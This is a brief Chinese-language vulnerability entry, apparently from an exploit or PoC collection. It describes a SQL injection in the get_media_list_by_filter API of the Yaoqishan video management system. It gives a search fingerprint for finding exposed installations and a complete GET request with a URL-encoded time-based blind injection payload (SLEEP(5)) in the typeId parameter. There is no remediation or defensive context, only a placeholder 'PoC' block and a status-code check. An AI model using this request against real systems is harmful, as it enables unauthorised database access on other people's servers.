# 妖气山视频管理系统get_media_list_by_filter存在SQL注入

妖气山视频管理系统 ｜ SQL注入 ｜ —
- **指纹**：`body="yaoqishan-header"`
- **请求**：`GET /api/get_media_list_by_filter.json?typeId=1%27+AND+%28SELECT+6178+FROM+%28SELECT%28SLEEP%285%29%29%29FJXn%29+AND+%27WDUU%27%3D%27WDUU HTTP/1.1`

**Payload**
```
PoC
```
- **响应特征**：200